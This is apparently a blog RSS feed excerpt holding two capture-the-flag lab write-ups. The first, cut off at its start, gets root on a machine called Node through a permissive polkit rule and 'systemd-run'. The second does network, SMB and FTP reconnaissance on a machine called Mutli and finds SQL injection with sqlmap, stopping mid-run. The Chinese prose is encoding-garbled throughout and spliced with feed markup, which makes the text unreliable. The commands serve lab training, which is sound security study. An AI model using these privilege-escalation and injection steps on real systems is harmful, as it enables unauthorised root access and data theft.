‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ËØÅÈÄöËøá SSH ÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh hungry@192.168.205.223
...
hungry@Node:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

ÊàêÂäüËé∑Âèñ `hungry` Áî®Êà∑ÁöÑ shell ÊùÉÈôê„ÄÇ

## ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Êú¨Âú∞‰ø°ÊÅØÊûö‰∏æ

Âú® `hungry` Áî®Êà∑ÁöÑ shell ‰∏≠ÔºåËøõË°åÊèêÊùÉÂêëÈáèÁöÑÊûö‰∏æ„ÄÇ



* **Ê£ÄÊü• `sudo` ÊùÉÈôêÔºö**

  ```bash
  hungry@Node:~$ sudo -l
  Sorry, user hungry may not run sudo on Node.
  ```

  Áî®Êà∑ `hungry` Ê≤°Êúâ‰ªª‰Ωï `sudo` ÊùÉÈôê„ÄÇ

* **Êü•Êâæ SUID Êñá‰ª∂Ôºö**

  ```bash
  hungry@Node:~$ find / -perm -4000 -type f 2&gt;/dev/null
  /usr/bin/chsh
  /usr/bin/chfn
  /usr/bin/newgrp
  /usr/bin/gpasswd
  /usr/bin/mount
  /usr/bin/su
  /usr/bin/umount
  /usr/bin/pkexec
  /usr/bin/sudo
  /usr/bin/passwd
  ...
  /usr/libexec/polkit-agent-helper-1
  ```

ÊàëÂ∞±‰∏çÁªßÁª≠ÂÜô‰∫ÜÔºåÊàëÊâíÊãâ‰∫ÜÂæà‰πÖÔºåÂÆûÂú®È°∂‰∏ç‰Ωè‰∫ÜÔºåÊàëÂéªÊâæ‰ΩúËÄÖË¶Å‰∫ÜÁÇπÊèêÁ§∫ÔºåÊòØ`/usr/libexec/polkit-agent-helper-1`

## 2. ÊºèÊ¥ûÂà©Áî® (`systemd-run` ÊèêÊùÉ)

Ê†πÊçÆÊèêÁ§∫ÔºåÂ∞ùËØï‰ΩøÁî®‰∏é Polkit ‰∫§‰∫íÁöÑ `systemd-run` ÂëΩ‰ª§ËøõË°åÊèêÊùÉ„ÄÇ

https://blog.csdn.net/li1136594919/article/details/131488386

```bash
hungry@Node:~$ systemd-run -t /bin/bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: hungry
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u7.service
Press ^] three times within 1s to disconnect TTY.
root@Node:/# id
uid=0(root) gid=0(root) groups=0(root)
```

ËæìÂÖ• `hungry` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂêéÔºåÊàêÂäüËé∑Âèñ‰∫Ü‰∏Ä‰∏™ root shell„ÄÇ

## 3. ÂéüÁêÜÂàÜÊûêÔºöPolkit ÈÖçÁΩÆÈîôËØØ

Êú¨Ê¨°ÊèêÊùÉÂπ∂ÈùûÂà©Áî®‰∫ÜÂ∏∏ËßÅÁöÑÂÜÖÊ†∏ÊºèÊ¥ûÊàñËΩØ‰ª∂ÊºèÊ¥ûÔºàÂ¶ÇPwnKitÔºâÔºåËÄåÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ**ÂÆâÂÖ®ÈÖçÁΩÆÈîôËØØ**ÔºåÂÖ∂Ê†∏ÂøÉÂú®‰∫é Polkit ÁöÑÊéàÊùÉÁ≠ñÁï•Ë¢´ÊúâÊÑèÂú∞ÂâäÂº±‰∫Ü„ÄÇ

1. **‰ªÄ‰πàÊòØ Polkit Âíå `systemd-run`Ôºü**

   *   **Polkit (PolicyKit)**: ÊòØ‰∏Ä‰∏™Â∫îÁî®Á®ãÂ∫èÁ∫ßÂà´ÁöÑÊéàÊùÉÊ°ÜÊû∂ÔºåÁî®‰∫éÊéßÂà∂Âì™‰∫õÁî®Êà∑ÂèØ‰ª•ÊâßË°åÂì™‰∫õÈúÄË¶ÅÁâπÊùÉÁöÑÊìç‰Ωú„ÄÇÂÆÉÂ∞±ÂÉè‰∏Ä‰∏™Á≤æÁªÜÂåñÁöÑ `sudo`Ôºå‰∏çÁõ¥Êé•Áªô‰∫àÁî®Êà∑ root shellÔºåËÄåÊòØÂØπÂÖ∑‰ΩìÂä®‰ΩúËøõË°åÊéàÊùÉ„ÄÇ
   *   **`systemd-run`**: ÊòØ‰∏Ä‰∏™ `systemd` Â∑•ÂÖ∑ÔºåÂèØ‰ª•Áî®Êù•Âä®ÊÄÅÂàõÂª∫‰∏Ä‰∏™‰∏¥Êó∂ÁöÑÊúçÂä°ÂçïÂÖÉÂπ∂ËøêË°åÊåáÂÆöÁöÑÂëΩ‰ª§„ÄÇÂΩìÂÆÉÈúÄË¶ÅÊâßË°åÁâπÊùÉÊìç‰ΩúÔºàÂ¶Ç‰ª• root Ë∫´‰ªΩËøêË°åÊúçÂä°ÔºâÊó∂Ôºå‰ºöÂêë `systemd` ‰∏ªËøõÁ®ãÔºà‰ª• root ÊùÉÈôêËøêË°åÔºâÂèëÂá∫ËØ∑Ê±Ç„ÄÇ

2. **ÊèêÊùÉÊµÅÁ®ãÊòØÊÄéÊ†∑ÁöÑÔºü**

   *   ÂΩì `hungry` Áî®Êà∑ÊâßË°å `systemd-run -t /bin/bash`ÔºåËØ•ÂëΩ‰ª§ËØ∑Ê±Ç `systemd` ‰ª• root ÊùÉÈôêÂêØÂä®‰∏Ä‰∏™ `/bin/bash` ËøõÁ®ã„ÄÇ
   *   `systemd` Â∞ÜËøô‰∏™ËØ∑Ê±Ç‰∫§Áî± Polkit ËøõË°åÊùÉÈôêË£ÅÂÜ≥„ÄÇ
   *   Polkit Ê£ÄÊü•ÂÖ∂Á≠ñÁï•ÔºåÁ°ÆÂÆö `hungry` Áî®Êà∑ÊòØÂê¶ÊúâÊùÉÊâßË°åËøô‰∏™Êìç‰ΩúÔºàAction ID ‰∏∫ `org.freedesktop.systemd1.manage-units`Ôºâ„ÄÇ

3. **ÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÁÇπÂú®Âì™ÈáåÔºü**

   *   ‰ªéÂëΩ‰ª§Ë°åÁöÑËæìÂá∫ `Authenticating as: hungry` ÂíåË¶ÅÊ±ÇËæìÂÖ•ÂØÜÁ†ÅÊù•ÁúãÔºåÁ≥ªÁªü**Ê≠£Âú®**ËøõË°åËÆ§ËØÅ„ÄÇ
   *   `org.freedesktop.systemd1.manage-units` Ëøô‰∏™Êìç‰ΩúÁöÑÈªòËÆ§Á≠ñÁï•ÈÄöÂ∏∏ÊòØ `auth_admin`ÔºåÊÑè‰∏∫**ÂøÖÈ°ªÁî±ÁÆ°ÁêÜÂëòÁªÑÔºàÂ¶Ç `sudo` ÁªÑÔºâÁöÑÁî®Êà∑Êù•Êèê‰æõÂØÜÁ†ÅËøõË°åËÆ§ËØÅ**„ÄÇ
   *   ÁÑ∂ËÄåÔºåÁî®Êà∑ `hungry` Âπ∂‰∏çÂú® `sudo` ÁªÑÈáåÔºå‰ΩÜÊèê‰æõ‰∫Ü**Ëá™Â∑±ÁöÑÂØÜÁ†Å**ÂêéÂç¥ËÆ§ËØÅÊàêÂäü‰∫Ü„ÄÇËøôË°®Êòé Polkit ÁöÑÁ≠ñÁï•Ë¢´‰øÆÊîπ‰∫Ü„ÄÇ
   *   ÊúÄÂèØËÉΩÁöÑ‰øÆÊîπÊòØÂ∞ÜËØ•Êìç‰ΩúÁöÑÊéàÊùÉÁ≠ñÁï•‰ªé `auth_admin`ÔºàÁÆ°ÁêÜÂëòËÆ§ËØÅÔºâÊîπ‰∏∫‰∫Ü **`auth_self_keep`**ÔºàÁî®Êà∑Ëá™Ë∫´ËÆ§ËØÅÔºâ„ÄÇËøôÊÑèÂë≥ÁùÄ‚Äú**Âè™Ë¶ÅËØ∑Ê±ÇËÄÖËÉΩËØÅÊòé‰ªñÂ∞±ÊòØ‰ªñËá™Â∑±ÔºàÈÄöËøáËæìÂÖ•Ëá™Â∑±ÁöÑÂØÜÁ†ÅÔºâÔºåÂ∞±ÂÖÅËÆ∏ÊâßË°åËØ•ÁâπÊùÉÊìç‰Ωú**‚Äù„ÄÇ

4. È™åËØÅ

   ÈúÄË¶ÅÁî®Êà∑‰∏∫rootÊùÉÈôêÔºåÂê¶ÂàôÊó†Ê≥ïÊü•Áúã

   ```bash
   root@Node:/# cat /etc/polkit-1/rules.d/50-myuser.rules
   polkit.addRule(function(action, subject) {
      
       if (action.id.startsWith('org.freedesktop.systemd1.') &amp;&amp; subject.local &amp;&amp; subject.isInGroup('hungry')) {
           return polkit.Result.YES;
       }
   });
   ```

   - polkit.addRule(function(action, subject) { ... });
     ËøôÂÆö‰πâ‰∫Ü‰∏ÄÊù°Êñ∞ÁöÑ Polkit ËßÑÂàô„ÄÇaction ‰ª£Ë°®Â∞ùËØïÊâßË°åÁöÑÊìç‰ΩúÔºåsubject ‰ª£Ë°®ÂèëËµ∑Êìç‰ΩúÁöÑÁî®Êà∑„ÄÇ
   - if (action.id.startsWith('org.freedesktop.systemd1.') &amp;&amp; ...)
     ËøôÊòØÁ¨¨‰∏Ä‰∏™Êù°‰ª∂ÔºöÊ£ÄÊü•ËØ∑Ê±ÇÁöÑÊìç‰Ωú ID ÊòØÂê¶‰ª• 'org.freedesktop.systemd1.' ÂºÄÂ§¥„ÄÇËøôÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÂÆΩÊ≥õÁöÑËßÑÂàôÔºåÂÆÉÊ∂µÁõñ‰∫ÜÊâÄÊúâ‰∏é systemd Áõ∏ÂÖ≥ÁöÑÁÆ°ÁêÜÊìç‰ΩúÔºåÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫éÂêØÂä®/ÂÅúÊ≠¢ÊúçÂä°„ÄÅÂêØÁî®/Á¶ÅÁî®ÊúçÂä°ÂçïÂÖÉÊñá‰ª∂Á≠â„ÄÇsystemd-run ÊâÄËß¶ÂèëÁöÑÊìç‰ΩúÂ∞±Âú®Ê≠§ËåÉÂõ¥ÂÜÖ„ÄÇ
   - ... &amp;&amp; subject.local &amp;&amp; ...
     Á¨¨‰∫å‰∏™Êù°‰ª∂ÔºöÊ£ÄÊü•Áî®Êà∑ÊòØÂê¶‰∏∫Êú¨Âú∞Áî®Êà∑„ÄÇÈÄöËøá SSH ÁôªÂΩïÁöÑ‰∫§‰∫íÂºè‰ºöËØùÈÄöÂ∏∏Ë¢´ËÆ§‰∏∫ÊòØ local ÁöÑ„ÄÇ
   - ... &amp;&amp; subject.isInGroup('hungry'))
     **ËøôÊòØÊúÄÂÖ≥ÈîÆÁöÑÊù°‰ª∂**ÔºöÊ£ÄÊü•ÂèëËµ∑Êìç‰ΩúÁöÑÁî®Êà∑ÊòØÂê¶Â±û‰∫éÂêç‰∏∫ 'hungry' ÁöÑÁî®Êà∑ÁªÑ„ÄÇÂú®ÂæàÂ§ö Linux ÂèëË°åÁâà‰∏≠ÔºåÂàõÂª∫‰∏Ä‰∏™Êñ∞Áî®Êà∑Êó∂‰ºöÂêåÊó∂ÂàõÂª∫‰∏Ä‰∏™ÂêåÂêçÁöÑ‰∏ªÁî®Êà∑ÁªÑÔºåÊâÄ‰ª•Áî®Êà∑ hungry Ê≠£Â•ΩÂ∞±Âú® hungry ÁªÑÈáå„ÄÇ
   - return polkit.Result.YES;
     Â¶ÇÊûú‰ª•‰∏äÊâÄÊúâ‰∏â‰∏™Êù°‰ª∂ÈÉΩÊª°Ë∂≥ÔºåËßÑÂàôÂ∞±ËøîÂõû YES„ÄÇËøôË°®Á§∫**Êó†Êù°‰ª∂ÂÖÅËÆ∏ÔºåÊó†ÈúÄËøõË°å‰ªª‰ΩïËÆ§ËØÅ**„ÄÇ
   - ËÅ™ÊòéÁöÑÊúãÂèãËÇØÂÆöÂèëÁé∞‰∫ÜÔºå‰ªÄ‰πà‰∏çÈúÄË¶ÅÈ™åËØÅÔºåÊàëÁöÑÊòéÊòéÈúÄË¶ÅÈ™åËØÅÂïäÔºåÈÇ£ÊòØÂõ†‰∏∫linuxÊéàÊùÉÂíåËÆ§ËØÅÊòØÂàÜÁ¶ªÁöÑÔºåPolkitÂÆ°Êü•Ëøô‰∏™Áî®Êà∑ÔºàhungryÔºâÊúâÊ≤°ÊúâËµÑÊ†ºÊâßË°åËøô‰∏™Êìç‰ΩúÔºåPAMÂÆ°Êü•Áé∞Âú®ÂùêÂú®ÁªàÁ´ØÂâçËæìÂÖ•ÂëΩ‰ª§ÁöÑËøô‰∏™‰∫∫ÔºåÁúüÁöÑÊòØhungryÊú¨‰∫∫ÂêóÔºü

   ÊâÄ‰ª•ÊÄªÁªìÂÆûÁé∞‰∫Ü**ÂÖÅËÆ∏‰ªª‰ΩïÊú¨Âú∞ÁôªÂΩïÁöÑ„ÄÅ‰∏îÂ±û‰∫é** **hungry** **Áî®Êà∑ÁªÑÁöÑÁî®Êà∑Ôºå~~Êó†ÈúÄÂØÜÁ†Å~~ÔºàÈúÄË¶ÅÂØÜÁ†ÅÔºâÂç≥ÂèØÊâßË°åÊâÄÊúâ systemd Áõ∏ÂÖ≥ÁöÑÁÆ°ÁêÜÊìç‰Ωú„ÄÇ**

   ËÄå‰∏∫‰ªÄ‰πàÊãøÂà∞ÁöÑÊòØrootÁöÑshellÔºå‰∏∫‰ªÄ‰πà‰∏çÊòØhungryÁöÑshellÔºåÊòØÂõ†‰∏∫systemdÊòØrootË∫´‰ªΩËøêË°åÁöÑ

   ÊâÄ‰ª•ÂÜçÊ¶ÇÊã¨‰∏Ä‰∏ãÂ∞±ÊòØ**ÊÇ®ÊòØ‰ª•** **hungry** **ÁöÑË∫´‰ªΩÈÄöËøá‰∫ÜËÆ§ËØÅÔºå‰ªéËÄåËé∑Âæó‰∫Ü‚ÄúÂëΩ‰ª§** **systemd** **ÂéªÂÅö‰∫ã‚ÄùÁöÑËµÑÊ†ºÔºõËÄåÊúÄÁªà‰∏∫ÊÇ®ÂàõÂª∫ shell ÁöÑÊòØ** **systemd** **ËøõÁ®ãÔºåÂÆÉÁî®ÁöÑÊòØÂÆÉËá™Â∑±Âõ∫ÊúâÁöÑ** **root** **Ë∫´‰ªΩ„ÄÇ**

## Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú

ÊàêÂäüËé∑Âèñ root ÊùÉÈôêÂêéÔºåËØªÂèñÊúÄÁªàÁöÑ flag„ÄÇ

```bash
root@Node:/# cat /root/root.txt /home/hungry/user.txt
flag{root-c946739aa8e0f1008c32e311076f355f}
flag{user-8c4b1157cb6f8884aa183ac0f1447e6c}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Node.html</guid><pubDate>Wed, 06 Aug 2025 00:48:02 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Mutli</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</link><description>![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)

ÁÆÄÂçïÂ§çÁé∞‰∏Ä‰∏ãÔºåÁúãÊ†∑Â≠êÂêéÈù¢ÊòØÂáÜÂ§áÊîæÂéªHMVÁöÑ„ÄÇÂÖ∂‰∏≠todd--&gt;ÊàëÊòØÈóÆÁæ§‰∏ªÊãø‰∫ÜÊèêÁ§∫ÔºåÊÜã‰∏çÂá∫Êù•‰∫ÜÔºåÂìàÂìàÂìà

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

# 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®ÂÜÖÁΩëÁéØÂ¢É‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºå‰ª•ÂèëÁé∞Â≠òÊ¥ªÁöÑ‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.205 08:00:27:b2:39:7d       PCS Systemtechnik GmbH
192.168.205.1   00:50:56:c0:00:08       VMware, Inc. (DUP: 2)
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫  `192.168.205.205`„ÄÇ

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á IP ÂêéÔºå‰ΩøÁî® `nmap` ÂØπÂÖ∂ËøõË°åËØ¶ÁªÜÁöÑÁ´ØÂè£Êâ´ÊèèÔºåÊé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÁ´ØÂè£ÂíåÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.205
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:01 EDT
Nmap scan report for 192.168.205.205
Host is up (0.00015s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
28080/tcp open  thor-engine
38007/tcp open  unknown
46413/tcp open  unknown
50129/tcp open  unknown
53115/tcp open  unknown
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```

ËøôÈáåÊàëËøò‰ª•‰∏∫ÊàëÁúºËä±‰∫ÜÔºåÊàëËøòÈáçÊñ∞Êâ´‰∫Ü‰∏ÄÈÅçÔºåÁ°ÆÂÆûMutliÔºåÂìàÂìàÂìà

Êâ´Êèè‰∏Ä‰∏ãÂÖ∑‰ΩìÊúçÂä°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p21,22,23,80,111,139,445,2049,3306,28080,38007,46413,50129,53115 -sC -sV 192.168.205.205 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:02 EDT
Nmap scan report for 192.168.205.205
Host is up (0.00026s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN
| Not valid before: 2025-07-17T11:34:00
|_Not valid after:  2035-07-15T11:34:00
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
23/tcp    open  telnet      Linux telnetd
80/tcp    open  http        Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35543/tcp6  mountd
|   100005  1,2,3      35639/udp6  mountd
|   100005  1,2,3      53115/tcp   mountd
|   100005  1,2,3      57320/udp   mountd
|   100021  1,3,4      37033/udp6  nlockmgr
|   100021  1,3,4      45001/tcp6  nlockmgr
|   100021  1,3,4      45069/udp   nlockmgr
|   100021  1,3,4      46413/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-title: Admin Panel
38007/tcp open  mountd      1-3 (RPC #100005)
46413/tcp open  nlockmgr    1-4 (RPC #100021)
50129/tcp open  mountd      1-3 (RPC #100005)
53115/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-22T03:02:46
|_  start_date: N/A
|_nbstat: NetBIOS name: MULTI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds
```

- **web** 80,28080
- **ÂÖ±‰∫´ÊúçÂä°** 2049
- **samba** 139/445
- **FTP** 21
- **Êï∞ÊçÆÂ∫ì** 3306
- **‰º†ÁªüÁ´ØÂè£** 22,23

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ

## ftp

ÊàëÊØîËæÉÂñúÊ¨¢ÂÖàÁúãFTP

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): anonymous
530 Permission denied.
ftp: Login failed
ftp&gt; exit
221 Goodbye.
```

ÂåøÂêçÁôªÂΩïÂ§±Ë¥•

## NFS

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ showmount -e 192.168.205.205
Export list for 192.168.205.205:
/srv/nfs_secure 127.0.0.1
```

Âè™ÂèØ‰ª•‰ªñÊú¨Âú∞ÊåÇËΩΩÔºå‰∏ã‰∏Ä‰∏™

## **Samba**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient -L //192.168.205.205 -N

        Sharename       Type      Comment
        ---------       ----      -------
        secure_share    Disk      
        IPC$            IPC       IPC Service (Secure Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.205 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd tmp                                        
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ smbclient //192.168.205.205/secure_share -N 
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Jul 18 11:22:38 2025
  ..                                  D        0  Thu Jul 17 07:40:23 2025
  bettercap                           N      159  Fri Jul 18 11:22:38 2025

                29801344 blocks of size 1024. 25516556 blocks available
smb: \&gt; get bettercap 
getting file \bettercap of size 159 as bettercap (31.1 KiloBytes/sec) (average 31.1 KiloBytes/sec)
smb: \&gt; exit

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat bettercap   
bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers
```

Ëøô‰∏™ÁÆó‰∏™ÊèêÁ§∫ÂêßÔºåbettercapÊØîËæÉÂá∫ÂêçÁöÑÂ∞±ÊòØ‰∫å„ÄÅ‰∏âÂ±ÇÊîªÂáªÔºåËøôÊòØÂêéÈù¢ÁöÑ‰∫ãÊÉÖ‰∫Ü

## mysql

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mysql -h 192.168.205.205 -u root -p
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mysql -h 192.168.205.205 -u root -p --skip-ssl
Enter password: 
ERROR 1130 (HY000): Host '192.168.205.128' is not allowed to connect to this MariaDB server
```

‰∏çÂÖÅËÆ∏Êàë‰ª¨ËøûÊé•Ôºå‰∏çÁôΩË¥πÂäõÊ∞î‰∫Ü

## web

80ÁöÑ‰∏ªÈ°µÊòØapache2ÁöÑÂàùÂßãÈ°µÔºåÂ∞ùËØïÁàÜÁ†¥ÁõÆÂΩïÔºåÊ≤°Êúâ‰ªª‰ΩïÊî∂Ëé∑

28080Êúâ‰∏úË•ø

![image-20250722153917170](https://7r1UMPHK.github.io/image/20250722153917297.webp)

ËÆ©Êàë‰ª¨ËæìÂÖ•Áî®Êà∑ÂêçÔºåÁªèËøáÂ∞ùËØïÔºå‰ªÄ‰πàÂêçÂ≠óÈÉΩÂèØ‰ª•ÔºåÊ≤°ÊúâsqlÔºåssti‰πãÁ±ªÁöÑÂ∞±ÂçïÁ∫Ø‰ΩøÁî®ÁöÑuser

ËæìÂÖ•userÂêé‰ºöË∑≥ËΩ¨Âà∞search

![image-20250722154042672](https://7r1UMPHK.github.io/image/20250722154042794.webp)

ÂèØ‰ª•ËæìÂÖ•‰∏Ä‰∫õÁî®Êà∑ÂêçÁªßÁª≠Êü•ÁúãÔºåÁªèËøáÊµãËØïÊúâsqlÊ≥®ÂÖ•ÔºàÂéªburpÊäì‰∏™ÂåÖÔºåÁÑ∂Âêésqlmap -rÔºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 1               
POST /search HTTP/1.1
Host: 192.168.205.205:28080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.205.205:28080
Connection: keep-alive
Referer: http://192.168.205.205:28080/search
Cookie: session=eyJ1c2VyIjoiYSJ9.aH9ASQ.1M-ZU-QfKjkL88N2Pyia0ZmKDkM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

keyword=1                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sqlmap -r 1 --batch            
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:44:08 /2025-07-22/

[03:44:08] [INFO] parsing HTTP request from '1'
[03:44:08] [INFO] testing connection to the target URL
[03:44:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:44:08] [INFO] testing if the target URL content is stable
[03:44:08] [INFO] target URL content is stable
[03:44:08] [INFO] testing if POST parameter 'keyword' is dynamic
[03:44:08] [WARNING] POST parameter 'keyword' does not appear to be dynamic
[03:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'keyword' might not be injectable
[03:44:08] [INFO] testing for SQL injection on POST parameter 'keyword'
[03:44:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:44:09] [WARNING] reflective value(s) found and filtering out
[03:44:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:44:09] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:44:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:44:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:44:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:44:09] [INFO] testing 'Generic inline queries'
[03:44:09] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[03:44:19] [INFO] POST parameter 'keyword' appears to be 'PostgreSQL &gt; 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
